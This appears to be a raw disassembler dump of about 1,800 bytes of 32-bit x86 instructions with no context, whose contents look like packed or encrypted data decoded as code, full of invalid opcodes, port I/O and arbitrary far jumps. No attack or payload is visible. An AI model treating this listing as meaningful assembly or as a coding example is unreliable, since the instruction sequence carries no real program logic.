  408fd6:	lods   al,BYTE PTR ds:[esi]
  408fd7:	adc    edi,DWORD PTR [ebx+0x5804c81a]
  408fdd:	push   esp
  408fde:	ss jbe 0x408fe9
  408fe1:	jl     0x408fcb
  408fe3:	sbb    BYTE PTR [eax+0xc],al
  408fe6:	stos   DWORD PTR es:[edi],eax
  408fe7:	ror    BYTE PTR [edi],1
  408fe9:	out    dx,eax
  408fea:	out    0x4,eax
  408fec:	dec    ecx
  408fed:	aad    0xd2
  408fef:	(bad)  
  408ff0:	cld    
  408ff1:	jne    0x408f83
  408ff3:	mov    edx,0xf1b5058a
  408ff8:	stos   BYTE PTR es:[edi],al
  408ff9:	mov    ds:0xe5347d05,eax
  408ffe:	xchg   edx,eax
  408fff:	or     ecx,DWORD PTR ds:0x1ef5234c
  409005:	mov    dl,0x59
  409007:	adc    DWORD PTR [ebx-0xa],edx
  40900a:	repz (bad) [ebp+0x74]
  40900e:	pushf  
  40900f:	out    0xd1,al
  409011:	stos   BYTE PTR es:[edi],al
  409012:	clc    
  409013:	(bad)  
  409014:	cmc    
  409015:	jae    0x409067
  409017:	(bad)  
  409018:	fidivr DWORD PTR ss:[edi+0x1c]
  40901c:	imul   eax,DWORD PTR ds:0x14761cd3,0xc6ed668b
  409026:	cdq    
  409027:	enter  0x9e16,0x48
  40902b:	dec    ebx
  40902c:	pop    ebp
  40902d:	mov    bl,0x17
  40902f:	in     eax,dx
  409030:	ror    DWORD PTR [esi-0x59ba0d78],0x12
  409037:	popf   
  409038:	inc    edi
  409039:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40903a:	in     eax,0x82
  40903c:	ret    
  40903d:	enter  0x7974,0xc7
  409041:	loop   0x409086
  409043:	mov    ds:0x6542be45,al
  409048:	jle    0x408fd9
  40904a:	xor    eax,0xd8018804
  40904f:	into   
  409050:	push   esp
  409051:	popa   
  409052:	mov    esp,0x58feb016
  409057:	fidivr WORD PTR [ecx]
  409059:	dec    esp
  40905a:	outs   dx,BYTE PTR ds:[esi]
  40905b:	and    BYTE PTR [eax-0x26],dh
  40905e:	and    bl,BYTE PTR [eax]
  409060:	push   eax
  409061:	push   esi
  409062:	or     BYTE PTR [edi-0x30],0x3b
  409066:	addr16 push ss
  409068:	pop    ecx
  409069:	push   edx
  40906a:	add    BYTE PTR ds:0x2474feee,bh
  409070:	popa   
  409071:	cmp    eax,0xac05ccdd
  409076:	retf   
  409077:	and    al,BYTE PTR [esi]
  409079:	sbb    eax,0x2c088781
  40907e:	jg     0x4090f4
  409080:	(bad)  
  409082:	mov    ebx,0xb8a8f9ff
  409087:	hlt    
  409088:	popf   
  409089:	aam    0xc0
  40908b:	or     ch,BYTE PTR [esi+0x2c0c74a0]
  409091:	mov    ah,0xd0
  409093:	mov    esp,0xb322f4ca
  409098:	mov    ecx,0x31d17547
  40909d:	push   ecx
  40909e:	dec    edi
  40909f:	pushfw 
  4090a1:	jg     0x409091
  4090a3:	cld    
  4090a4:	dec    ebx
  4090a5:	mov    ds:0xae4d8f4f,al
  4090aa:	test   al,0x6
  4090ac:	arpl   WORD PTR [edx],si
  4090ae:	js     0x4090b3
  4090b0:	and    al,0xd4
  4090b2:	xlat   BYTE PTR ds:[ebx]
  4090b3:	adc    ebx,DWORD PTR [ecx-0x2f]
  4090b6:	mov    esi,0x46c0ae83
  4090bb:	int    0xde
  4090bd:	clc    
  4090be:	lea    edx,[eax-0x39]
  4090c1:	ss je  0x409136
  4090c4:	adc    DWORD PTR [ebp-0x13],ebp
  4090c7:	pusha  
  4090c8:	clc    
  4090c9:	cdq    
  4090ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4090cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090cc:	dec    ebp
  4090cd:	into   
  4090ce:	hlt    
  4090cf:	aas    
  4090d0:	lahf   
  4090d1:	jno    0x40913c
  4090d3:	mov    eax,ds:0x961a46fa
  4090d8:	in     al,dx
  4090d9:	add    dh,bl
  4090db:	xchg   edi,eax
  4090dc:	shr    esi,0xc7
  4090df:	jmp    0xdaf8:0xad47c906
  4090e6:	push   es
  4090e7:	ds clc 
  4090e9:	mov    esp,0x8004c5b7
  4090ee:	push   esi
  4090ef:	adc    BYTE PTR [ebx-0x5419ddc0],dl
  4090f5:	add    eax,0x1d5bacb7
  4090fa:	mov    esp,0x889b7f86
  4090ff:	mov    edx,0x347534ce
  409104:	add    BYTE PTR [edi],0x21
  409107:	push   es
  409108:	inc    ebp
  409109:	popf   
  40910a:	xor    eax,0x356c731e
  40910f:	test   al,0xe
  409111:	sbb    edx,0xffffff89
  409114:	and    BYTE PTR [eax-0x1a],dh
  409117:	adc    edx,esi
  409119:	inc    esi
  40911a:	addr16 out 0x61,eax
  40911d:	rol    edx,cl
  40911f:	dec    eax
  409120:	xor    BYTE PTR [edi],ah
  409122:	xor    bh,BYTE PTR [ebx+0x33a7da31]
  409128:	in     al,0xa3
  40912a:	mov    ds:0x9db65177,al
  40912f:	jbe    0x40912e
  409131:	iret   
  409132:	xlat   BYTE PTR ds:[ebx]
  409133:	jge    0x40914e
  409135:	lds    edi,FWORD PTR [ecx-0x6411eb5c]
  40913b:	inc    eax
  40913c:	mov    BYTE PTR [ecx+0x4b],dh
  40913f:	loop   0x409178
  409141:	cmp    bh,BYTE PTR [esi+0x1b]
  409144:	sti    
  409145:	mov    bl,0xe2
  409147:	sbb    al,0x74
  409149:	inc    ecx
  40914a:	out    dx,al
  40914b:	pop    ds
  40914c:	sbb    al,0x2d
  40914e:	cs leave 
  409150:	in     al,dx
  409151:	mov    ch,0x91
  409153:	cmc    
  409154:	retf   0x43e5
  409157:	mov    bl,0xa5
  409159:	inc    esp
  40915a:	cmc    
  40915b:	into   
  40915c:	inc    esi
  40915d:	push   ecx
  40915e:	inc    eax
  40915f:	out    dx,eax
  409160:	xchg   ecx,eax
  409161:	bound  ebp,QWORD PTR [esi]
  409163:	and    DWORD PTR [esi],eax
  409165:	jno    0x4090f3
  409167:	popa   
  409168:	(bad)  
  409169:	fiadd  WORD PTR [edi-0x369013d7]
  40916f:	add    BYTE PTR [ecx+esi*8+0x4],al
  409173:	mov    ebp,0xe85af18f
  409178:	test   DWORD PTR [eax-0x4d],ecx
  40917b:	push   0x1e
  40917d:	mov    ds:0x2a63c532,eax
  409182:	sbb    BYTE PTR [esi],bl
  409184:	js     0x409166
  409186:	push   edi
  409187:	adc    DWORD PTR [edi+0x5f],ebx
  40918a:	arpl   WORD PTR [ebp+0x43],sp
  40918d:	retf   
  40918e:	ror    BYTE PTR [edi],0x4c
  409191:	cmp    ebp,DWORD PTR [ebp-0x37]
  409194:	mov    al,0x3e
  409196:	push   ecx
  409197:	repnz scas eax,DWORD PTR es:[edi]
  409199:	fisubr DWORD PTR [edx-0x13614c04]
  40919f:	loope  0x4091a8
  4091a1:	cmp    BYTE PTR [esp+edx*8-0x55],al
  4091a5:	mov    ebx,0x18402fd0
  4091aa:	sub    al,0x42
  4091ac:	xor    DWORD PTR [ebp-0x65],edx
  4091af:	neg    DWORD PTR [eax+0x198994d2]
  4091b5:	sahf   
  4091b6:	jp     0x4091c6
  4091b8:	jge    0x40913a
  4091ba:	mov    esi,0x615b26cd
  4091bf:	mov    bl,0xf3
  4091c1:	jge    0x409150
  4091c3:	xchg   esi,eax
  4091c4:	pop    esi
  4091c5:	mov    ah,0x6f
  4091c7:	sar    BYTE PTR [ecx-0x28],0x94
  4091cb:	dec    edx
  4091cc:	jmp    0x99eb:0x82c13d3a
  4091d3:	mov    esi,0x252ee5ce
  4091d8:	or     DWORD PTR [ebx],esi
  4091da:	mov    ecx,0xd5b30a5c
  4091df:	or     eax,0x879c88a0
  4091e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091e5:	and    esp,DWORD PTR [eax]
  4091e7:	push   cs
  4091e8:	adc    edx,DWORD PTR [ebx-0x4c]
  4091eb:	sbb    BYTE PTR [ebx+edx*2],0x9e
  4091ef:	ins    BYTE PTR es:[edi],dx
  4091f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091f1:	or     ch,BYTE PTR [ecx-0x4a8ba99f]
  4091f7:	dec    edi
  4091f8:	adc    BYTE PTR [ecx],al
  4091fa:	retf   
  4091fb:	push   es
  4091fc:	addr16 in eax,0x5d
  4091ff:	inc    ecx
  409200:	push   ecx
  409201:	and    dh,al
  409203:	jb     0x409216
  409205:	mov    bh,0x3c
  409207:	lahf   
  409208:	sub    dh,BYTE PTR [ebx]
  40920a:	into   
  40920b:	out    0x4b,al
  40920d:	fidivr WORD PTR [ebp-0x4bfddf99]
  409213:	dec    edx
  409214:	test   eax,0x6ffa745a
  409219:	shr    edx,0xd6
  40921c:	mov    eax,0xd6b542a4
  409221:	mov    esi,0x58c7f628
  409226:	std    
  409227:	cmp    ecx,edi
  409229:	retf   0xbd23
  40922c:	pop    esp
  40922d:	ds out dx,eax
  40922f:	jle    0x409274
  409231:	mov    DWORD PTR [eax+0x50a73271],eax
  409237:	icebp  
  409238:	or     BYTE PTR [ecx+0x507633b2],ch
  40923e:	sub    BYTE PTR [esi-0x3f],al
  409241:	dec    esp
  409242:	sbb    DWORD PTR [edx-0x32635390],esi
  409248:	dec    eax
  409249:	daa    
  40924a:	(bad)  
  40924c:	fidiv  WORD PTR ds:0x694c016d
  409252:	mov    fs,WORD PTR [ebx-0x4d]
  409255:	dec    ebp
  409256:	imul   ecx,ebp,0xfffffffa
  409259:	jns    0x4092b2
  40925b:	repnz test BYTE PTR [ebp+0x2],bl
  40925f:	or     DWORD PTR ds:0x6460d89,0xd223f1d2
  409269:	mov    esi,0x4a0d6d8c
  40926e:	or     ecx,eax
  409270:	daa    
  409271:	adc    BYTE PTR [ebx-0x70],al
  409274:	jbe    0x4092a8
  409276:	mov    ds:0x68096c20,eax
  40927b:	jle    0x409270
  40927d:	jmp    0xa4dde78b
  409282:	sub    DWORD PTR [esi-0x5538b87a],edi
  409288:	dec    edi
  409289:	jne    0x4092a0
  40928b:	add    dl,BYTE PTR [eax]
  40928d:	push   0x17
  40928f:	scas   al,BYTE PTR es:[edi]
  409290:	retf   0x2b46
  409293:	sbb    DWORD PTR [ecx],eax
  409295:	sub    DWORD PTR [edx+0x45],edi
  409298:	sbb    al,0xca
  40929a:	(bad)  
  40929b:	out    0xf,al
  40929d:	xor    DWORD PTR [edi+0x3e],esi
  4092a0:	cmp    BYTE PTR [edi-0x2a7b58f7],dl
  4092a6:	xchg   edi,eax
  4092a7:	iret   
  4092a8:	in     eax,0x38
  4092aa:	(bad)  
  4092ab:	xor    BYTE PTR [edi-0x74],ah
  4092ae:	xor    al,0xc6
  4092b0:	rcr    al,0xdc
  4092b3:	adc    DWORD PTR [ecx+0xdf6df4c],edi
  4092b9:	mov    al,ds:0x31f0c5e1
  4092be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092bf:	iret   
  4092c0:	push   0xce21fcea
  4092c5:	cs (bad) 
  4092c7:	and    al,cl
  4092c9:	mov    esi,0xba2e71be
  4092ce:	mov    ebx,0x5ae9dbfc
  4092d3:	out    dx,al
  4092d4:	in     al,0x78
  4092d6:	call   0x2f09:0x7a7f2151
  4092dd:	into   
  4092de:	pop    esp
  4092df:	adc    eax,DWORD PTR [eax-0x6adf3721]
  4092e5:	scas   al,BYTE PTR es:[edi]
  4092e6:	cli    
  4092e7:	adc    BYTE PTR [edx-0x7875af8d],ch
  4092ed:	pop    ds
  4092ee:	mov    esp,0x6bb046b9
  4092f3:	jmp    0xa6b3604e
  4092f8:	inc    esp
  4092f9:	scas   al,BYTE PTR es:[edi]
  4092fa:	stc    
  4092fb:	xlat   BYTE PTR es:[ebx]
  4092fd:	aad    0x76
  4092ff:	jae    0x4092c4
  409301:	aam    0x60
  409303:	jnp    0x4092ad
  409305:	shl    BYTE PTR [ebp-0x43],1
  409308:	outs   dx,BYTE PTR ds:[esi]
  409309:	stos   DWORD PTR es:[edi],eax
  40930a:	ins    DWORD PTR es:[edi],dx
  40930b:	(bad)  
  40930c:	mov    ds:0xc3208984,eax
  409311:	shr    dh,0x93
  409314:	les    ebp,FWORD PTR [ecx+0x794f3027]
  40931a:	jmp    0x4092c1
  40931c:	out    dx,al
  40931d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40931e:	jg     0x40934d
  409320:	mov    cl,0xc0
  409322:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409323:	nop
  409324:	(bad)  
  409326:	push   ss
  409327:	mov    cl,0x3f
  409329:	jmp    0x4092c2
  40932b:	cmp    dh,BYTE PTR [ebx+esi*2+0x49]
  40932f:	inc    ebp
  409330:	or     eax,0xca765c3
  409335:	dec    eax
  409336:	scas   eax,DWORD PTR es:[edi]
  409337:	mov    DWORD PTR ds:0x1e3aa84f,esi
  40933d:	pop    ds
  40933e:	scas   al,BYTE PTR es:[edi]
  40933f:	pop    ds
  409340:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409341:	clc    
  409342:	push   0xfffffff0
  409344:	inc    eax
  409345:	mov    ebp,DWORD PTR [ecx+esi*8+0x77edc211]
  40934c:	sbb    bl,ah
  40934e:	out    0x92,al
  409350:	pop    ebp
  409351:	jge    0x409397
  409353:	push   0xffffffe6
  409355:	enter  0x682b,0xd5
  409359:	rcl    BYTE PTR [eax+eax*2-0xaab9d66],0x6f
  409361:	stos   BYTE PTR es:[edi],al
  409362:	and    al,0x9c
  409364:	sub    eax,esp
  409366:	aad    0xe3
  409368:	mov    cl,0x4f
  40936a:	jg     0x40933e
  40936c:	ret    
  40936d:	mov    ds:0xcc9b091c,al
  409372:	or     bl,al
  409374:	aaa    
  409375:	jmp    0x93d7:0x27cbaa1a
  40937c:	and    dh,BYTE PTR [ecx+esi*4+0x29]
  409380:	inc    ebx
  409381:	jl     0x40937d
  409383:	jp     0x4093c4
  409385:	mov    eax,0xf30813c
  40938a:	in     eax,dx
  40938b:	leave  
  40938c:	popa   
  40938d:	pop    es
  40938e:	push   cs
  40938f:	nop
  409390:	sub    edx,eax
  409392:	pop    es
  409393:	aas    
  409394:	je     0x409410
  409396:	jnp    0x4093c7
  409398:	pop    edi
  409399:	rol    DWORD PTR [ebp-0x1e1bab6],1
  40939f:	mov    esp,0xf3ccac7e
  4093a4:	aam    0x2f
  4093a6:	xchg   edi,eax
  4093a7:	movups xmm3,XMMWORD PTR [eax+0x38]
  4093ab:	loopne 0x40939a
  4093ad:	pop    ss
  4093ae:	adc    BYTE PTR [ebx+0x5e2005ae],bh
  4093b4:	sbb    al,cl
  4093b6:	sbb    eax,0x19fd69b1
  4093bb:	xlat   BYTE PTR ds:[ebx]
  4093bc:	cmc    
  4093bd:	fsubr  st(6),st
  4093bf:	mov    edx,0x60f63537
  4093c4:	or     DWORD PTR ds:0x7db1119e,0x6f1aab11
  4093ce:	loop   0x4093ec
  4093d0:	adc    eax,0x12c67809
  4093d5:	sti    
  4093d6:	sti    
  4093d7:	cli    
  4093d8:	adc    ebx,DWORD PTR [ebp+0x5ce43950]
  4093de:	int    0x79
  4093e0:	js     0x4093d5
  4093e2:	pop    esp
  4093e3:	push   ds
  4093e4:	sub    ecx,DWORD PTR [eax+eiz*2+0x44]
  4093e8:	mov    eax,0x1e65f5f1
  4093ed:	arpl   dx,bx
  4093ef:	pop    ds
  4093f0:	cs and ah,dl
  4093f3:	jae    0x53ba6831
  4093f9:	xor    edi,esi
  4093fb:	jg     0x409453
  4093fd:	(bad)  
  4093fe:	test   al,0x7f
  409400:	test   eax,0xb49976ba
  409405:	xchg   edi,eax
  409406:	fsub   QWORD PTR [edi+0x7bd867d5]
  40940c:	enter  0x95dd,0x64
  409410:	aad    0xa2
  409412:	adc    BYTE PTR [esi+0x579e3913],bh
  409418:	mul    DWORD PTR ds:0x2403663e
  40941e:	test   ebx,esp
  409420:	add    edi,ebp
  409422:	popa   
  409423:	or     DWORD PTR [edi-0xb],esp
  409426:	mov    ecx,0xb601cdb
  40942b:	sti    
  40942c:	add    eax,0x2d5972c1
  409431:	(bad)  
  409432:	jne    0x40945b
  409434:	loope  0x409445
  409436:	out    0x11,eax
  409438:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409439:	push   DWORD PTR [ebp-0x463f326a]
  40943f:	sbb    al,0x71
  409441:	adc    eax,0x8188075e
  409446:	push   ds
  409447:	xor    eax,0x2f04e80d
  40944c:	sub    ebx,edx
  40944e:	lods   eax,DWORD PTR ds:[esi]
  40944f:	and    ah,0x7c
  409452:	mov    al,ds:0xa7643a1f
  409457:	mov    ds:0xf3a0326a,eax
  40945c:	cmp    ebx,ecx
  40945e:	out    0xcf,eax
  409460:	fs loopne 0x409419
  409463:	popa   
  409464:	pop    edi
  409465:	sti    
  409466:	loope  0x40941d
  409468:	(bad)  
  40946a:	pop    edx
  40946b:	idiv   BYTE PTR ds:0xb2dac213
  409471:	shl    BYTE PTR [eax+0x5d],1
  409474:	arpl   WORD PTR [ebx-0x11],ax
  409477:	loopne 0x40944d
  409479:	not    BYTE PTR ss:[esp+edx*2]
  40947d:	shl    ch,1
  40947f:	adc    al,0x0
  409481:	pop    esp
  409482:	push   ebx
  409483:	mov    dl,BYTE PTR [ebx-0x22]
  409486:	std    
  409487:	test   DWORD PTR [esi+0x1ac87b37],0xe3f34178
  409491:	cld    
  409492:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409493:	jecxz  0x4094ca
  409495:	cwde   
  409496:	and    eax,DWORD PTR [ecx+edx*8]
  409499:	lods   al,BYTE PTR ds:[esi]
  40949a:	xor    DWORD PTR [esi],0xffffff81
  40949d:	push   0x6e9e1e23
  4094a2:	mov    ds:0xa767d4ec,al
  4094a7:	xlat   BYTE PTR ds:[ebx]
  4094a8:	shl    BYTE PTR [ebx+0x13],cl
  4094ab:	repz add esp,0x29
  4094af:	push   edx
  4094b0:	stc    
  4094b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4094b2:	dec    eax
  4094b3:	mov    esi,0x1574c1c3
  4094b8:	enter  0x830e,0x39
  4094bc:	xchg   ecx,eax
  4094bd:	pushf  
  4094be:	jmp    FWORD PTR [esi-0x1eed1b11]
  4094c4:	out    dx,al
  4094c5:	and    al,0xaf
  4094c7:	call   0xcd35:0xe003cea0
  4094ce:	adc    eax,0x9c7f63d
  4094d3:	mov    al,0x5d
  4094d5:	dec    ebx
  4094d6:	sub    cl,BYTE PTR [ecx-0x5b216d62]
  4094dc:	sbb    bh,bh
  4094de:	jmp    0x40946c
  4094e0:	loop   0x4094a2
  4094e2:	mov    esi,0x3a5814ec
  4094e7:	test   BYTE PTR [esi-0x386522fd],ch
  4094ed:	adc    edx,DWORD PTR [eax]
  4094ef:	or     edi,esp
  4094f1:	sbb    al,BYTE PTR [eax]
  4094f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4094f4:	mov    al,ds:0xc6a3064
  4094f9:	jnp    0x409497
  4094fb:	outs   dx,BYTE PTR ds:[esi]
  4094fc:	mov    ebp,0xe453f641
  409501:	push   eax
  409502:	popa   
  409503:	out    0x79,al
  409505:	fst    st(2)
  409507:	add    DWORD PTR [edx-0x30],0xaf3c10e1
  40950e:	pop    ds
  40950f:	bound  ebx,QWORD PTR [edi-0x438b037a]
  409515:	or     dl,0x98
  409518:	shl    BYTE PTR [ebx-0x6],1
  40951b:	stos   BYTE PTR es:[edi],al
  40951c:	lods   al,BYTE PTR ds:[esi]
  40951d:	mov    eax,0x87b8d185
  409522:	add    ecx,edx
  409524:	leave  
  409525:	dec    esp
  409526:	adc    ebx,esp
  409528:	adc    BYTE PTR [esi+ebx*4-0x76],0xb9
  40952d:	inc    ebx
  40952e:	hlt    
  40952f:	jle    0x409503
  409531:	and    bl,BYTE PTR [edx-0x46]
  409534:	jg     0x409546
  409536:	dec    ebp
  409537:	cmp    DWORD PTR [edi+0x397cdddd],esp
  40953d:	repnz repnz nop
  409540:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409541:	pusha  
  409542:	mov    edi,0xeebf3e99
  409547:	data16 cmp al,0xb2
  40954a:	adc    al,0x8
  40954c:	mov    ds:0xe750f653,al
  409551:	std    
  409552:	hlt    
  409553:	test   al,0x8f
  409555:	ja     0x409570
  409557:	mov    bl,BYTE PTR [eax+0x342d8c85]
  40955d:	mov    bl,0x1e
  40955f:	mov    bh,0x92
  409561:	shl    eax,0x5
  409564:	sbb    DWORD PTR [edx-0x75],edx
  409567:	data16 stos BYTE PTR es:[edi],al
  409569:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40956a:	lahf   
  40956b:	push   ebp
  40956c:	stos   BYTE PTR es:[edi],al
  40956d:	ins    DWORD PTR es:[edi],dx
  40956e:	jmp    0x7613:0xb7658a2c
  409575:	(bad)  
  409576:	pop    ds
  409577:	es pop edx
  409579:	jle    0x409513
  40957b:	scas   eax,DWORD PTR es:[edi]
  40957c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40957d:	sbb    bl,dl
  40957f:	sbb    eax,ebx
  409581:	and    dh,BYTE PTR [ebx]
  409583:	mov    ds:0xbdc60fe7,al
  409588:	pop    es
  409589:	push   ebx
  40958a:	push   0x6d
  40958c:	xchg   edi,eax
  40958d:	xchg   DWORD PTR [edi],ebp
  40958f:	push   ebp
  409590:	sub    eax,0x1fd1eca3
  409595:	dec    DWORD PTR [edx]
  409597:	test   DWORD PTR [edi-0x12],esp
  40959a:	push   0xffffffe5
  40959c:	dec    ebp
  40959d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40959e:	sbb    BYTE PTR [ebp-0x604d6045],ch
  4095a4:	leave  
  4095a5:	inc    ecx
  4095a6:	cld    
  4095a7:	pop    ecx
  4095a8:	mov    dh,0x12
  4095aa:	test   ch,bh
  4095ac:	xchg   ebp,eax
  4095ad:	hlt    
  4095ae:	scas   al,BYTE PTR es:[edi]
  4095af:	stos   BYTE PTR es:[edi],al
  4095b0:	cdq    
  4095b1:	out    dx,al
  4095b2:	mov    al,ds:0xe5a468f0
  4095b7:	add    DWORD PTR [ecx+0x3f9df5e2],eax
  4095bd:	add    al,0x19
  4095bf:	inc    edi
  4095c0:	jb     0x4095dc
  4095c2:	ret    0xbcfb
  4095c5:	dec    eax
  4095c6:	fild   WORD PTR [esi]
  4095c8:	inc    esi
  4095c9:	add    eax,0x4dc6a384
  4095ce:	adc    eax,0xb04397e3
  4095d3:	pop    es
  4095d4:	shl    dh,0x46
  4095d7:	js     0x4095b8
  4095d9:	xchg   DWORD PTR [eax+eax*8],esp
  4095dc:	jo     0x4095aa
  4095de:	bound  edi,QWORD PTR [esp+ecx*2-0x5f]
  4095e2:	mov    esi,DWORD PTR ds:0xe398a5c2
  4095e8:	jmp    0xd6841275
  4095ed:	(bad)  
  4095ee:	pop    esp
  4095ef:	pop    ss
  4095f0:	and    BYTE PTR [ebx],ah
  4095f2:	retf   0x44f7
  4095f5:	dec    esp
  4095f6:	lock pop ebx
  4095f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095f9:	dec    ebp
  4095fa:	imul   ebp,DWORD PTR [ecx+0x44e9ebb7],0x288f9670
  409604:	mov    eax,ds:0x34346abe
  409609:	mov    cl,0x53
  40960b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40960c:	mov    al,ds:0xd0f61103
  409611:	daa    
  409612:	fisttp WORD PTR ss:[edx-0x21]
  409616:	jne    0x409689
  409618:	hlt    
  409619:	pop    edi
  40961a:	inc    edi
  40961b:	add    BYTE PTR [ecx],ch
  40961d:	push   0xffffff8f
  40961f:	popa   
  409620:	iret   
  409621:	jg     0x4095a6
  409623:	adc    BYTE PTR [ebx],al
  409625:	push   0x4b
  409627:	sub    eax,0xf05f1889
  40962c:	fucomp st(1)
  40962e:	retf   0xaf2f
  409631:	lea    edi,[edi-0x429b4aa5]
  409637:	arpl   WORD PTR [esp+edi*4-0x48],ax
  40963b:	dec    ebx
  40963c:	add    bh,BYTE PTR [ebp-0x47f99344]
  409642:	jns    0x4096a9
  409644:	push   edi
  409645:	pop    edx
  409646:	loopne 0x409620
  409648:	jnp    0x409674
  40964a:	pop    eax
  40964b:	and    edi,DWORD PTR [edi+eiz*4+0x40]
  40964f:	es test al,ch
  409652:	arpl   dx,bp
  409654:	div    DWORD PTR [eax+edx*4-0x27]
  409658:	mov    al,ds:0xafcd6861
  40965d:	dec    ebx
  40965e:	mov    edi,0xc3e9fb4c
  409663:	sbb    al,0x80
  409666:	push   eax
  409667:	call   0xd13a2d3e
  40966c:	sahf   
  40966d:	pop    eax
  40966e:	out    0x5a,eax
  409670:	or     ebp,edx
  409672:	and    dh,al
  409674:	push   eax
  409675:	in     al,dx
  409676:	dec    esp
  409677:	les    esi,FWORD PTR [edi]
  409679:	sbb    ebx,DWORD PTR [edi+edi*1-0x6f]
  40967d:	(bad)  
  40967e:	jne    0x40965d
  409680:	outs   dx,BYTE PTR ds:[esi]
  409681:	das    
  409682:	jmp    0xb76ccb8b
  409687:	sbb    BYTE PTR [ecx+0x4f],0x87
  40968b:	mov    dh,0x9f
  40968d:	fsubr  DWORD PTR [ecx+edx*4-0x32c30c01]
  409694:	fidivr DWORD PTR [edi-0x31c63989]
  40969a:	pop    eax
  40969b:	dec    esp
  40969c:	(bad)  
  40969d:	(bad)  
  40969f:	loopne 0x4096b0
  4096a1:	jmp    0x138814d2
  4096a6:	adc    al,0x3a
  4096a8:	or     al,0x27
  4096aa:	dec    BYTE PTR [ecx+0x31778778]
  4096b0:	push   ebp
  4096b1:	nop
  4096b2:	cwde   
  4096b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096b4:	test   dl,al
  4096b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096b7:	imul   edi,esp,0x9eb374a1
  4096bd:	and    eax,0x586c6e9c
  4096c2:	mov    al,ds:0xf9e60ac5
  4096c7:	mov    ds:0x7a6174df,eax
  4096cc:	arpl   WORD PTR [esp+eiz*4+0x675a6e48],cx
  4096d3:	push   esp
  4096d4:	cmp    dl,BYTE PTR [edi+0x4f]
  4096d7:	push   ds
  4096d8:	or     BYTE PTR [esp+ebp*1],bl
  4096db:	data16 jbe 0x4096be
  4096de:	(bad)  
  4096e0:	imul   esi,DWORD PTR [eax],0xffffffa1
  4096e3:	dec    ebx
  4096e4:	pop    ds
  4096e5:	pushf  
  4096e6:	adc    esi,DWORD PTR [eax+0x72]
  4096e9:	or     al,0xde
  4096eb:	xchg   esi,eax
  4096ec:	jno    0x409705
  4096ee:	mov    dh,0xd7
  4096f0:	addr16 add bh,bh
  4096f3:	ins    BYTE PTR es:[edi],dx
  4096f4:	xor    BYTE PTR [esi+0x54],ch
  4096f7:	pop    edi
  4096f8:	shr    dl,cl
  4096fa:	pop    esp
  4096fb:	ret    0x58ad
  4096fe:	aad    0x78
  409700:	or     al,0x2b
  409702:	and    al,0xbe
  409704:	adc    al,0xc0
  409706:	dec    edi
  409707:	add    DWORD PTR [ecx-0x38],ebx
  40970a:	mov    dl,BYTE PTR [edi]
  40970c:	inc    edi
  40970d:	dec    esi
  40970e:	outs   dx,DWORD PTR ds:[esi]
  40970f:	lods   al,BYTE PTR ds:[esi]
  409710:	shr    BYTE PTR [ecx],0x3b
  409713:	fnstenv [ebx]
  409715:	mov    ch,al
  409717:	sub    al,0x61
  409719:	rol    BYTE PTR ds:0xad06116e,cl
  40971f:	adc    DWORD PTR [edi],ebp
  409721:	ds imul al
  409724:	inc    ecx
  409725:	pop    ebp
  409726:	mov    dl,0x23
  409728:	dec    ecx
  409729:	xor    al,0x9e
  40972b:	es stos BYTE PTR es:[edi],al
  40972d:	sbb    eax,0x6361468c
  409732:	cmp    al,BYTE PTR [esi+ebp*2]
  409735:	cmp    al,cl
  409737:	mov    ?,WORD PTR [edi+0x2f]
  40973a:	jno    0x409791
  40973c:	cwde   
  40973d:	jbe    0x409768
  40973f:	cs push ss
  409741:	pop    edx
  409742:	push   edx
  409743:	hlt    
  409744:	push   ss
  409745:	xor    BYTE PTR [ebx],cl
  409747:	lods   al,BYTE PTR ds:[esi]
  409748:	sbb    ebp,esp
  40974a:	lea    ebx,[edx]
  40974c:	dec    ebp
  40974d:	add    DWORD PTR [edx-0x76],0x6e6afba2
  409754:	mov    ebx,0x13f29e4b
  409759:	or     al,BYTE PTR [edx-0x3f]
  40975c:	mov    al,ds:0xe103c3ca
  409761:	mov    ecx,0xa955cdf6
  409766:	and    edx,DWORD PTR [eax-0x5f5a06a4]
  40976c:	stos   DWORD PTR es:[edi],eax
  40976d:	scas   al,BYTE PTR es:[edi]
  40976e:	jmp    0x9ff:0xe3e401f0
  409775:	repz add bl,BYTE PTR [esi]
  409778:	dec    ebp
  409779:	in     eax,dx
  40977a:	das    
  40977b:	arpl   WORD PTR [edx],ax
  40977d:	push   es
  40977e:	es std 
  409780:	sbb    DWORD PTR [ebx+0x24],ebx
  409783:	mov    esp,eax
  409785:	nop
  409786:	dec    eax
  409787:	ins    BYTE PTR es:[edi],dx
  409788:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409789:	call   0xe40f9d65
  40978e:	or     ch,bl
  409790:	dec    ecx
  409791:	repnz and cl,BYTE PTR [ebp+0xc]
  409795:	xchg   ebp,eax
  409796:	xchg   ecx,eax
  409797:	mov    ebp,0xf29acef5
  40979c:	(bad)  
  40979d:	jmp    0x4097f4
  40979f:	dec    eax
  4097a0:	push   ecx
  4097a1:	cmp    DWORD PTR [ebx+0x7b],ecx
  4097a4:	lods   al,BYTE PTR ds:[esi]
  4097a5:	xchg   esp,eax
  4097a6:	retf   0x77a6
